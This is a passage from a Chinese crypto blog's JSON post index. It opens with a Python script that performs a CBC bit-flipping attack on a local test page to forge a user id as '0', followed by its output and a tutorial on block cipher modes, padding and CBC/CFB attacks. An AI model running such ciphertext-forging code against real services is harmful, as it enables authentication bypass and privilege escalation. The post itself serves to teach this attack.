伪造id成功。 程序实现如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://test.loc/cbc.php'</span></span><br><span class=\"line\"></span><br><span class=\"line\">clipher_hex = (<span class=\"string\">'89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4'</span></span><br><span class=\"line\">               <span class=\"string\">'b6e786f473b52182000a0d4ce2145994573a92d257a514d1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plain_id = <span class=\"string\">'1'</span></span><br><span class=\"line\">clipher_indexs = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(clipher_hex)/<span class=\"number\">2</span>):</span><br><span class=\"line\">    clipher_text = list(clipher_hex.decode(<span class=\"string\">'hex'</span>))</span><br><span class=\"line\">    c = clipher_text[i]</span><br><span class=\"line\">    clipher_text[i] = plain_id</span><br><span class=\"line\">    new_clipher_hex = <span class=\"string\">''</span>.join(clipher_text).encode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">    resp = requests.get(url, params=&#123;<span class=\"string\">'a'</span>: new_clipher_hex&#125;)</span><br><span class=\"line\">    new_plain_id = resp.content[<span class=\"number\">3</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> new_plain_id == c <span class=\"keyword\">and</span> resp.content[<span class=\"number\">4</span>] == <span class=\"string\">'&lt;'</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 有可能出现 c == palin_id 的情况，所以这里可能有多组结果</span></span><br><span class=\"line\">        <span class=\"keyword\">print</span> i, c.encode(<span class=\"string\">'hex'</span>), c</span><br><span class=\"line\">        clipher_indexs.append(i)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_id = <span class=\"string\">'0'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> clipher_indexs:</span><br><span class=\"line\">    clipher_text = list(clipher_hex.decode(<span class=\"string\">'hex'</span>))</span><br><span class=\"line\">    c = clipher_text[i]</span><br><span class=\"line\">    fake_c = chr(ord(c) ^ ord(plain_id) ^ ord(fake_id))</span><br><span class=\"line\">    clipher_text[i] = fake_c</span><br><span class=\"line\">    new_clipher_hex = <span class=\"string\">''</span>.join(clipher_text).encode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">    resp = requests.get(url, params=&#123;<span class=\"string\">'a'</span>: new_clipher_hex&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> resp.content[<span class=\"number\">3</span>] == fake_id <span class=\"keyword\">and</span> resp.content[<span class=\"number\">4</span>] == <span class=\"string\">'&lt;'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"make a=&#123;&#125;, get id='0'\"</span>.format(<span class=\"string\">''</span>.join(clipher_text).encode(<span class=\"string\">'hex'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>得到结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make a=89b52bac0331cb0b393c1ac828b4ee0e07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1, get id=&apos;0&apos;</span><br></pre></td></tr></table></figure>\n<h3 id=\"应用条件\"><a href=\"#应用条件\" class=\"headerlink\" title=\"应用条件\"></a>应用条件</h3><p>能获取明文信息，密文或IV可控</p>\n","categories":["密码学"],"tags":["CBC","Padding Oracle","比特翻转"]},{"title":"分组密码工作模式","url":"http://www.beesfun.com/2017/03/06/分组密码工作模式/","content":"<p>在密码学中，分组加密(Block cipher)，又称分块加密或块密码，是一种对称密钥算法。 它将明文分成多个等长的模块(block)，使用确定的算法和对称密钥对每组分别加密解密。</p>\n<p>常见的分组加密算法有: DES、3DES、AES、IDEA。</p>\n<a id=\"more\"></a>\n<h2 id=\"工作模式\"><a href=\"#工作模式\" class=\"headerlink\" title=\"工作模式\"></a>工作模式</h2><p>参考: <a href=\"https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\" target=\"_blank\" rel=\"noopener\">维基百科</a></p>\n<p>分组密码算法只能加密<code>固定长度</code>的分组，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适<code>填充方式</code>将数据扩展到匹配密码块大小的长度。对于变长数据需要对分组密码算法进行迭代，以便将明文全部加密。而迭代的方法就称为分组密码的模式（mode），主要有以下模式：</p>\n<ul>\n<li>ECB模式：Electronic CodeBook mode（电子密码模式）</li>\n<li>CBC模式：Cipher Block Chaining mode（密码分组链接模式）</li>\n<li>CFB模式：Cipher FeedBack mode（密文反馈模式）</li>\n<li>OFB模式：Output FeedBack mode（输出反馈模式）</li>\n<li>CTR模式：CounTeR mode（计数器模式）</li>\n</ul>\n<p>常见分组密码算法分组长度和秘钥长度如下表:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>密码算法</th>\n<th>分组长度</th>\n<th>秘钥长度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DES</td>\n<td>64 bit/8 byte</td>\n<td>64(56+8) bit/8 byte</td>\n</tr>\n<tr>\n<td>3DES</td>\n<td>64 bit/8 byte</td>\n<td>64/64*2/64*3 bit</td>\n</tr>\n<tr>\n<td>AES</td>\n<td>128 bit/16 byte</td>\n<td>128/192/256 bit</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>一般采用的填充方式有如下几种:</p>\n<ul>\n<li>ANSIX923</li>\n</ul>\n<p>ANSIX923 填充字符串由一个字节序列组成，此字节序列的最后一个字节填充字节序列的长度，其余字节均填充数字零。<br>假定块长度为8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</p>\n<ul>\n<li>ISO10126</li>\n</ul>\n<p>ISO10126 填充字符串由一个字节序列组成，此字节序列的最后一个字节填充字节序列的长度，其余字节填充随机数据。<br>假定块长度为 8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 7D 2A 75 EF F8 EF 07</p>\n<ul>\n<li>PKCS7</li>\n</ul>\n<p>PKCS7 填充字符串由一个字节序列组成，每个字节填充该字节序列的长度。<br>假定块长度为 8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07，如果恰好8个字节时还要补8个字节的0x08，可以让解密的数据很确定无误的移除多余的字节。 PKCS5Padding 和 PKCS7Padding 在这方面是类似的。不同点在于，选择算法的时候如果选用 PKCS5Padding 填充模式，就是明确指定块大小是 8 个字节。选用 PKCS7Padding 则是没有明确指定块大小。如果选择算法的时候选用 PKCS7Padding 填充模式，同时设置块大小为 8 字节，和选用 PKCS5Padding 填充模式，没有设置块大小（实际已经设置了 8 字节），这两种情况下，两种填充模式没有区别。另外有个值得注意的是，AES 中块大小是固定 16 字节。</p>\n<ul>\n<li>Zeros</li>\n</ul>\n<p>填充字符串由设置为零的字节组成</p>\n<h2 id=\"ECB\"><a href=\"#ECB\" class=\"headerlink\" title=\"ECB\"></a>ECB</h2><p>ECB 将需要加密的明文按照块密码的块大小分为若干块，并对每个块独立进行加密，加密和解密过程如下:</p>\n<img src=\"/2017/03/06/分组密码工作模式/Mode_ECB_Enc.png\">\n<img src=\"/2017/03/06/分组密码工作模式/Mode_ECB_Dec.png\">\n<p>ECB模式中，明文和密文是一一对应的，相同的明文分组加密将会得到相应的密文分组。因此，它不能很好的隐藏数据模式。同时还存在安全风险，容易受到重放攻击, 改变密文分组的顺序，可以改变解密后明文分组的顺序。</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>简单</td>\n<td>不能隐藏明文的模式</td>\n</tr>\n<tr>\n<td>利于并行计算</td>\n<td>可能对明文进行主动攻击</td>\n</tr>\n<tr>\n<td>不会传递误差</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h2 id=\"CBC\"><a href=\"#CBC\" class=\"headerlink\" title=\"CBC\"></a>CBC</h2><p>CBC模式加密，先将明文分组与前一个密文分组(或为初始化向量IV)进行XOR运算，然后再进行加密；解密，密文分组先进行解密，然后再进行xor运算得到明文分组。</p>\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CBC_Enc.png\">\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CBC_Dec.png\">\n<p>CBC加密，每个密文块都依赖于它前面所有的明文块，这有效解决了ECB模式中泄露明文模式的问题，但同时明文块的误差会传播到后面所有的密文块。</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>安全性好于ECB</td>\n<td>误差传递</td>\n</tr>\n<tr>\n<td>隐藏了明文模式</td>\n<td>不利于并行计算</td>\n</tr>\n<tr>\n<td></td>\n<td>需要初始化向量IV</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"翻转攻击\"><a href=\"#翻转攻击\" class=\"headerlink\" title=\"翻转攻击\"></a>翻转攻击</h3><p>CBC解密可以用如下式子表示：</p>\n<ul>\n<li>Plaintext-1 = Decrypt(Ciphertext-1) XOR IV  只用于第一个组块</li>\n<li>Plaintext-N = Decrypt(Ciphertext-N) XOR Ciphertext-N-1   用于第二及剩下的组块</li>\n</ul>\n<p>改变IV的值，只会影响解密出的第一组明文，而改变密文中的<code>一位</code>只会导致其对应的明文块完全改变，下一个明文块中的<code>对应位</code>发生改变，而不会影响到其它明文块的内容。<br>因此，修改IV可以操纵解密出的第一组明文，修改某一个密文分组可以操纵后一个解密出的明文分组，也就是说CBC模式存在两个攻击点：</p>\n<ul>\n<li>IV向量，影响第一个明文分组</li>\n<li>第N个密文分组, 影响第N+1个明文分组</li>\n</ul>\n<h3 id=\"攻击场景\"><a href=\"#攻击场景\" class=\"headerlink\" title=\"攻击场景\"></a>攻击场景</h3><p>常见的攻击场景有权限提升和验证绕过</p>\n<h2 id=\"CFB\"><a href=\"#CFB\" class=\"headerlink\" title=\"CFB\"></a>CFB</h2><p>CFB模式可以看做是一种使用分组密码来实现流密码的方式, CFB模式中由密码算法所生成的比特序列称为密钥流（key stream）。在CFB模式中，密码算法就相当于用来生成密钥流的伪随机数生成器，而初始化向量就相当于伪随机数生成器的“种子”， 它的明文数据可以被逐比特加密。</p>\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CFB_Enc.png\">\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CFB_Dec.png\">\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>分组密码转化为流模式</td>\n<td>误差传递</td>\n</tr>\n<tr>\n<td>隐藏了明文模式</td>\n<td>不利于并行计算</td>\n</tr>\n<tr>\n<td>可以及时加密传送小于分组的数据</td>\n<td>需要初始化向量IV</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"重放攻击\"><a href=\"#重放攻击\" class=\"headerlink\" title=\"重放攻击\"></a>重放攻击</h3><img src=\"/2017/03/06/分组密码工作模式/Mode_CFB_ReplayAttack.png\">\n<h2 id=\"OFB\"><a href=\"#OFB\" class=\"headerlink\" title=\"OFB\"></a>OFB</h2><p>OFB模式中，密码算法的输出会反馈到密码算法的输入中。OFB模式不是通过密码算法对明文直接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的</p>\n<img src=\"/2017/03/06/分组密码工作模式/Mode_OFB_Enc.png\">\n<img src=\"/2017/03/06/分组密码工作模式/Mode_OFB_Dec.png\">\n<h2 id=\"CTR\"><a href=\"#CTR\" class=\"headerlink\" title=\"CTR\"></a>CTR</h2><p>CTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。CTR模式中，每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流。也就是说最终的密文分组是通过将计数器加密得到的比特序列，与明文分组进行XOR而得到的</p>\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CTR_Enc.png\">\n<img src=\"/2017/03/06/分组密码工作模式/Mode_CTR_Dec.png\">\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>加密和解密使用了完全相同的结构，程序实现上比较容易</li>\n<li>可以以任意顺序对分组进行加密和解密</li>\n<li>不会放大错误，假设CTR模式的密文分组中有一个比特被翻转了，则解密后明文分组中仅有与之对应的比特会被翻转，这一错误不会放大</li>\n</ul>\n","categories":["密码学"],"tags":["CBC","ECB","分组加密"]},{"title":"about","url":"http://www.beesfun.com/about/index.html","content":"<h2 id=\"waiting\"><a href=\"#waiting\" class=\"headerlink\" title=\"waiting\"></a>waiting</h2>","categories":[],"tags":[]},{"title":"分类","url":"http://www.beesfun.com/categories/index.html","content":"","categories":[],"tags":[]},{"title":"标签","url":"http://www.beesfun.com/tags/index.html","content":"","categories":[],"tags":[]}]